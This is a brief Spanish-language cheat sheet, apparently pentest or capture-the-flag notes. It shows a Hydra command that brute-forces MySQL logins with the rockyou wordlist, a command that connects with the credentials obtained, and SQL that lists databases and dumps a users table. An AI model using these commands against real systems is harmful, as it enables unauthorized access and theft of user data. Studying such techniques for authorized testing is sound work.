# Fuerza Bruta contra Bases de Datos

## Hydra contra MySQL

```bash
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt mysql://<IP_objetivo>
```

## Conexion Manual a MySQL

Una vez obtenidas las credenciales, se accede a la base de datos.

```bash
mysql -h <IP_objetivo> -u <usuario> -p<contraseña>
```

Comandos basicos de MySQL:

```sql
show databases;
use <database>;
show tables;
SELECT * FROM users;
```
